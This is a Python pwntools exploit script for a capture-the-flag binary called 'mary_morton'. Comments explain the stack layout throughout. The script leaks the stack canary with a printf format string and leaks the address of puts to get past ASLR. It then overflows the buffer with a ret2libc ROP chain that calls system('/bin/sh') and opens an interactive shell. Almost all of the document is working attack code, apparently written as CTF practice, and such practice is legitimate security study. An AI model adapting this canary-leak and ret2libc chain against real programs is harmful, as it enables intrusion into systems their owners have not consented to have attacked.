import struct
import pwn
import time

# mary_morton is a 64-bit dynamically linked executable
# NX is enabled, There is a Stack Canary, ASLR is turned on


# This executable has a function which allows you to do a printf format exploit, and another that allows you to do a buffer overflow
# This should just be a simple printf canary leak, then a puts(puts got) leak to defeat ASLR, and then a ret2libc, but...
# This binary is garbage. Its super buggy, and in general just a pain to work with
# The canary leak and puts(puts got) leak only work some of the time
# To solve this we loop over until we get a pass of the process that we are able to exploit

# In addition, the second payload delivery only works if there is a small I/O delay, so we just time.wait(.5) before it

#################################
#### Leaking the canary Math ####
#################################

# 144 is subtracted from rsp
# Last 8 is canary

# [128 byte buffer]
# [8 bytes of alignment]
# [Canary]
# [rbp storage]
# [ret addr]

# rdi is format string parameter
# rsi, rdx, rcx, r8, r9 should be first 5 things leaked
# Then, 136/8 = 17
# 17 + 5 = 22, so the 23rd thing leaked should be the canary

# to test: %23$p as input should result in a null byte terminated value each time

# The I/O for this binary is super buggy
# So a lot of times it will just not leak anything
# To solve this, just loop until we get a run that works, and then use that one

###################################################################
#### Gadgets and Addresses for buffer overflow and ret2libcrop ####
###################################################################

target_elf = pwn.ELF('mary_morton')

# pop rdi; ret
pop_rdi = struct.pack("<Q", 0x400ab3)
ret_pad = struct.pack("<Q", 0x400ab4)

# puts plt
# Equivalent to: objdump -D mary_morton | grep puts
puts_plt = target_elf.symbols['puts']

# puts got
# Equivalent to: objdump -R mary_morton | grep puts 
puts_got = target_elf.got['puts']

print(f"puts_plt: {hex(puts_plt)} puts_got: {hex(puts_got)}")

# Loopback address in main function:
loop_back = struct.pack("<Q", 0x400826)

######################
#### Leaking Loop ####
######################

while True:
    target = pwn.process('./mary_morton')

    #### LEAKING CANARY ####

    target.sendline(b'2')
    target.sendline(b'qqcc%23$paabb')

    leak = target.recv(1024)
    canary_start = leak.find(b'qqcc')
    canary_end = leak.find(b'aabb')
    canary = leak[(canary_start+4):canary_end]

    if len(canary) != 18:
        print(f"bug occured: canary was not leaked, running again...")
        continue

    canary = int(canary, 16)
    print(f"Canary = {hex(canary)}")


    #### Buffer Overflow for puts(puts got) ####

    # 144 is subtracted from rsp:

    # [128 byte buffer]
    # [8 bytes of alignment]
    # [canary]
    # [rbp storage]
    # [ret addr]

    payload = b'a' * 136
    payload += struct.pack("<Q", canary)
    payload += b'b' * 8
    payload += pop_rdi
    payload += struct.pack("<Q", puts_got)
    payload += struct.pack("<Q", puts_plt)
    payload += loop_back

    target.sendline(b'1')
    target.sendline(payload)

    if target.can_recv(): # Wish I knew about this sooner!
        leak2 = target.recvuntil(b'Welcome to')
        break
    else:
        print("Stack overflow has bugged out! Looping...")
        continue

first_newline = leak2.find(b'\n')
second_newline = leak2.rfind(b'\n')
leak2 = leak2[(first_newline+1):second_newline]

if len(leak2) < 4:
    print(f"Leak 2 failed: {leak2}, exiting...")
    exit()

leak2 = leak2 + b'\x00' * (8 - len(leak2))
leaked_puts_got = struct.unpack("<Q", leak2)[0]

print(f"Leaked puts addr: {hex(leaked_puts_got)}")

########################################################
#### Calculating libc base and computing libc addrs ####
########################################################

libc_elf = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')

libc_puts_offset = libc_elf.symbols['puts']

libc_base = leaked_puts_got - libc_puts_offset

print(f"libc base: {hex(libc_base)}")

libc_system_offset = libc_elf.symbols['system']
libc_bin_sh_offset = next((libc_elf.search(b'/bin/sh')))

########################
#### Final Overflow ####
########################

payload2 = b'a' * 136
payload2 += struct.pack("<Q", canary)
payload2 += b'b' * 8
payload2 += pop_rdi
payload2 += struct.pack("<Q", libc_base + libc_bin_sh_offset)
payload2 += ret_pad
payload2 += struct.pack("<Q", libc_base + libc_system_offset)

target.sendline(b'1')
time.sleep(.5) # This is necessary to deal with the buggy io of this target
target.sendline(payload2)
target.interactive()
